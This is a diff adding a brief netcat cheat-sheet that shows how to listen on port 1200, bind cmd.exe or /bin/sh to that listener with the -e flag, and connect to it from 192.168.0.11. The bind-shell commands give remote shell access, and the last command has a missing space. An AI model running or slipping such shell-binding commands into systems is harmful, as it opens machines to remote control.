@@ -1,0 +1,14 @@
+# Allows computer to [l]isten on [p]ort 1200
+$ nc -vlp 1200
+
+# Command will be executed when another computer connects
+$ nc -vlp 1200 -e cmd.exe
+
+# Envoke shell when connected
+$ ncat -e /bin/sh -vlp 1200
+
+# To CONNECT to the running nc
+$ nc -vv192.168.0.11 1200
+
+
+
